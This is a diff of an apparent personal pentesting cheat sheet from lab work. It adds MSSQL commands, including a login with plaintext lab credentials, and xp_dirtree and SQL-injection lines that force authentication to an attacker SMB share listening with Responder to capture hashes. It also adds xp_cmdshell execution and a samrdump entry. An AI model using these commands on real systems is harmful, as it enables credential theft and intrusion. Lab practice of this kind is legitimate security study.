@@ -14,13 +14,13 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [samrdump](#samrdump)
   - [tar](#tar)
   - [proof.txt](#proof.txt)
   - [gitdumper](#gitdumper)
   - [KPCLI && kdbx](#kpcli_&&_kdbx)
   - [whatweb](#whatweb)
   - [ntpdate](#ntpdate)
-  - [MSSQL](#mssql)
   - [certipy](#certipy)
   - [netexec](#netexec)
   - [Nslookup](#nslookup)
@@ -535,6 +535,8 @@ SELECT SLEEP(5)	Blind/No Output	Delays page response for 5 seconds and returns 0
 ## MSSQL
 ```bash
 python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
+./mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.129.228.253
+
 select name from sys.databases
 
 # db version
@@ -550,10 +552,10 @@ select * from offsec.dbo.users;
 > xp_cmdshell whoami
 > enable_xp_cmdshell
 
-# try xp_dirtree
+# try xp_dirtree (sudo responder -I tun0 -A)
+> xp_dirtree \\10.10.14.83\share\dir
 > xp_dirtree c:\
 > xp_dirtree c:\inetpub\wwwroot
-> 
 ```
 
 ## sqlite
@@ -574,6 +576,7 @@ sqlitebrowser ma.db
 or
 sudo Responder -I tun0 -A
 ';EXEC xp_dirtree \\192.168.45.176\share
+EXEC MASTER.sys.xp_dirtree '\\10.10.14.19\share', 1, 1
 
 or
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
@@ -646,6 +649,9 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+### samrdump
+samrdump.py 10.129.14.128
+
 ### tar
 ```bash
 # extract its contents
